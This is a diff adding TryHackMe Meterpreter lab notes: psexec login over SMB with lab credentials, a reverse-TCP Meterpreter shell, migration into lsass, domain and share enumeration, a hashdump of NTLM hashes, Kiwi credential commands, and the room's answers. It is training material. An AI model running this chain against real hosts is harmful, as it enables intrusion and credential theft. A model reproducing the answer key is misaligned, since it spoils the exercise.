@@ -190,6 +190,441 @@ Metasploit consists of six core modules that make up the bulk of the tools you w
 
 `load`
 
+## Metasploit: Meterpreter
+Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.
+[https://tryhackme.com/room/meterpreter]
+
+# Task 5  Post-Exploitation Challenge
+
+Meterpreter provides several important post-exploitation tools.
+Commands mentioned previously, such as `getsystem`and `hashdump` will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
+
+```
+meterpreter > load python
+Loading extension python...Success.
+meterpreter > python_execute "print 'TryHackMe Rocks!'"
+[+] Content written to stdout:
+TryHackMe Rocks!
+```
+The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
+* Gathering further information about the target system.
+* Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
+* Privilege escalation.
+* Lateral movement.
+Once any additional tool is loaded using the `load` command, you will see new options on the `help` menu. The example below shows commands added for the Kiwi module (using the l`oad kiwi` command).
+
+```
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+```
+These will change according to the loaded menu, so running the `help` command after loading a module is always a good idea.
+```
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+```
+The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
+You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
+
+        Username: ballen
+        Password: Password1
+
+# Answer the questions below
+# What is the computer name?   `ACME-TEST`
+```
+msf6 > use exploit/windows/smb/psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > show options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   RHOSTS                              yes       The target host(s), see https
+                                                 ://docs.metasploit.com/docs/u
+                                                 sing-metasploit/basics/using-
+                                                 metasploit.html
+   RPORT              445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTI                   no        Service description to be use
+   ON                                            d on target for pretty listin
+                                                 g
+   SERVICE_DISPLAY_N                   no        The service display name
+   AME
+   SERVICE_NAME                        no        The service name
+   SMBDomain          .                no        The Windows domain to use for
+                                                  authentication
+   SMBPass                             no        The password for the specifie
+                                                 d username
+   SMBSHARE                            no        The share to connect to, can
+                                                 be an admin share (ADMIN$,C$,
+                                                 ...) or a normal read/write f
+                                                 older share
+   SMBUser                             no        The username to authenticate
+                                                 as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     10.10.243.229    yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.187.150
+RHOSTS => 10.10.187.150
+msf6 exploit(windows/smb/psexec) > set SMBUser ballen
+SMBUser => ballen
+msf6 exploit(windows/smb/psexec) > set SMBPass Password1
+SMBPass => Password1
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 10.10.243.229:4444 
+[*] 10.10.187.150:445 - Connecting to the server...
+[*] 10.10.187.150:445 - Authenticating to 10.10.187.150:445 as user 'ballen'...
+[*] 10.10.187.150:445 - Selecting PowerShell target
+[*] 10.10.187.150:445 - Executing the payload...
+[+] 10.10.187.150:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175686 bytes) to 10.10.187.150
+[*] Meterpreter session 1 opened (10.10.243.229:4444 -> 10.10.187.150:51632) at 2024-01-24 02:25:27 +0000
+
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /root/pAeXAnRa.html
+[*] Streaming...
+[-] Error running command screenshare: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.
+meterpreter > [GFX1-]: Unrecognized feature ACCELERATED_CANVAS2D
+[2024-01-24T02:26:15Z ERROR viaduct::backend::ffi] Missing HTTP status
+[2024-01-24T02:26:15Z ERROR viaduct::backend::ffi] Missing HTTP status
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User               Path
+ ---   ----  ----         ----  -------  ----               ----
+ 0     0     [System Pro
+             cess]
+ 4     0     System       x64   0
+ 68    4     Registry     x64   0
+ 396   4     smss.exe     x64   0
+ 548   536   csrss.exe    x64   0
+ 620   612   csrss.exe    x64   1
+ 672   536   wininit.exe  x64   0
+ 688   612   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
+             e                           EM                 2\winlogon.exe
+ 752   672   services.ex  x64   0
+             e
+ 764   672   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\lsass.exe
+ 812   688   dwm.exe      x64   1        Window Manager\DW  C:\Windows\System3
+                                         M-1                2\dwm.exe
+ 888   752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 904   752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
+                                         ORK SERVICE        2\svchost.exe
+ 956   752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 992   752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
+                                         ORK SERVICE        2\svchost.exe
+ 1068  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 1188  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 1200  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 1208  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 1256  752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
+                                         ORK SERVICE        2\svchost.exe
+ 1392  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 1408  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 1444  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 1716  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 2176  1872  powershell.  x86   0        NT AUTHORITY\SYST  C:\Windows\SysWOW6
+             exe                         EM                 4\WindowsPowerShel
+                                                            l\v1.0\powershell.
+                                                            exe
+ 2232  688   fontdrvhost  x64   1        Font Driver Host\  C:\Windows\System3
+             .exe                        UMFD-1             2\fontdrvhost.exe
+ 2240  672   fontdrvhost  x64   0        Font Driver Host\  C:\Windows\System3
+             .exe                        UMFD-0             2\fontdrvhost.exe
+ 2304  752   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\spoolsv.exe
+ 2332  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 2348  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
+                                         L SERVICE          2\svchost.exe
+ 2380  752   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             agent.exe                   EM                 mazon\SSM\amazon-s
+                                                            sm-agent.exe
+ 2420  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\svchost.exe
+ 2452  752   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             xe                          EM                 mazon\XenTools\Lit
+                                                            eAgent.exe
+ 2488  752   dfsrs.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\dfsrs.exe
+ 2500  752   Microsoft.A  x64   0        NT AUTHORITY\SYST  C:\Windows\ADWS\Mi
+             ctiveDirect                 EM                 crosoft.ActiveDire
+             ory.WebServ                                    ctory.WebServices.
+             ices.exe                                       exe
+ 2508  752   ismserv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\ismserv.exe
+ 2536  752   dfssvc.exe   x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\dfssvc.exe
+ 2628  752   dns.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\dns.exe
+ 2928  2380  ssm-agent-w  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             orker.exe                   EM                 mazon\SSM\ssm-agen
+                                                            t-worker.exe
+ 2936  2928  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\conhost.exe
+ 3012  752   vds.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\vds.exe
+ 3156  688   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\LogonUI.exe
+ 3232  2176  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\conhost.exe
+ 3624  752   msdtc.exe    x64   0        NT AUTHORITY\NETW  C:\Windows\System3
+                                         ORK SERVICE        2\msdtc.exe
+
+meterpreter > migrate 764
+[*] Migrating from 2176 to 764...
+[*] Migration completed successfully.
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /root/irrmieor.html
+[*] Streaming...
+[-] Error running command screenshare: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.
+meterpreter > [GFX1-]: Unrecognized feature ACCELERATED_CANVAS2D
+[2024-01-24T02:28:53Z ERROR viaduct::backend::ffi] Missing HTTP status
+[2024-01-24T02:28:53Z ERROR viaduct::backend::ffi] Missing HTTP status
+
+meterpreter > sysinfo
+Computer        : ACME-TEST
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : FLASH
+Logged On Users : 7
+Meterpreter     : x64/windows
+meterpreter > 
+```
+ 
+# What is the target domain?   `FLASH`
+```
+msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
+msf6 post(windows/gather/enum_domain) > show options
+
+Module options (post/windows/gather/enum_domain):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(windows/gather/enum_domain) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ACME  10.10.243.229:4444 -> 10.10
+                                     -TEST                       .187.150:51632 (10.10.187.1
+                                                                 50)
+
+msf6 post(windows/gather/enum_domain) > set SESSION 1
+SESSION => 1
+msf6 post(windows/gather/enum_domain) > run
+
+[+] Domain FQDN: FLASH.local
+[+] Domain NetBIOS Name: FLASH
+[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.187.150)
+[*] Post module execution completed
+```
+
+# What is the name of the share likely created by the user?   `speedster`
+```
+msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
+msf6 post(windows/gather/enum_shares) > show options
+
+Module options (post/windows/gather/enum_shares):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CURRENT  true             yes       Enumerate currently configured shares
+   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialo
+                                       g
+   RECENT   true             yes       Enumerate recently mapped shares
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(windows/gather/enum_shares) > set SESSION 1
+SESSION => 1
+msf6 post(windows/gather/enum_shares) > run
+
+[*] Running module against ACME-TEST (10.10.187.150)
+[*] The following shares were found:
+[*] 	Name: SYSVOL
+[*] 	Path: C:\Windows\SYSVOL\sysvol
+[*] 	Remark: Logon server share 
+[*] 	Type: DISK
+[*] 
+[*] 	Name: NETLOGON
+[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+[*] 	Remark: Logon server share 
+[*] 	Type: DISK
+[*] 
+[*] 	Name: speedster
+[*] 	Path: C:\Shares\speedster
+[*] 	Type: DISK
+[*] 
+[*] Post module execution completed
+```
+ 
+# What is the NTLM hash of the jchambers user?  `69596c7aa1e8daee17f8e78870e25a5c`
+```
+msf6 post(windows/gather/enum_shares) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:eec208ef4eee9839fb5d8f0a77dde8b8:::
+```
+
+# What is the cleartext password of the jchambers user?  `Trustno1`
+
+# Where is the "secrets.txt"  file located? (Full path of the file)  `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt `
+```
+meterpreter > search -f secrets.txt
+Found 1 result...
+=================
+
+Path                                                            Size (bytes)  Modified (UTC)
+----                                                            ------------  --------------
+c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100
+
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd "Program Files (x86)"
+meterpreter > pwd
+C:\Program Files (x86)
+meterpreter > ls
+Listing: C:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2021-03-11 07:29:52 +0000  AWS SDK for .NET
+040777/rwxrwxrwx  4096  dir   2021-03-11 07:29:53 +0000  AWS Tools
+040777/rwxrwxrwx  0     dir   2018-09-15 08:28:48 +0100  Common Files
+040777/rwxrwxrwx  4096  dir   2020-03-18 06:47:41 +0000  Internet Explorer
+040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  Microsoft.NET
+040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Defender
+040777/rwxrwxrwx  0     dir   2018-09-15 08:19:03 +0100  Windows Mail
+040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Media Player
+040777/rwxrwxrwx  0     dir   2021-07-30 21:33:31 +0100  Windows Multimedia Platform
+040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Photo Viewer
+040777/rwxrwxrwx  0     dir   2018-09-15 08:19:03 +0100  Windows Portable Devices
+040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  Windows Sidebar
+040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2018-09-15 08:16:48 +0100  desktop.ini
+040777/rwxrwxrwx  0     dir   2018-09-15 08:28:48 +0100  windows nt
+
+meterpreter > cd "Windows Multimedia Platform"
+meterpreter > pwd
+C:\Program Files (x86)\Windows Multimedia Platform
+meterpreter > ls
+Listing: C:\Program Files (x86)\Windows Multimedia Platform
+===========================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  35     fil   2021-07-30 08:44:27 +0100  secrets.txt
+100666/rw-rw-rw-  40432  fil   2018-09-15 08:12:04 +0100  sqmapi.dll
+
+meterpreter > cat secrets.txt
+My Twitter password is KDSvbsw3849!
+```
+
+# What is the Twitter password revealed in the "secrets.txt" file? `KDSvbsw3849`
+
+# Where is the "realsecret.txt" file located? (Full path of the file) `c:\inetpub\wwwroot\realsecret.txt `
+```
+meterpreter > search -f realsecret.txt
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100
+
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > cd "inetpub"
+meterpreter > pwd
+C:\inetpub
+meterpreter > cd "wwwroot"
+meterpreter > cat realsecret.txt
+The Flash is the fastest man alive
+```
+# What is the real secret?   `The Flash is the fastest man alive`
+
 ## [Task 5] Move that shell! 
 
 Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!
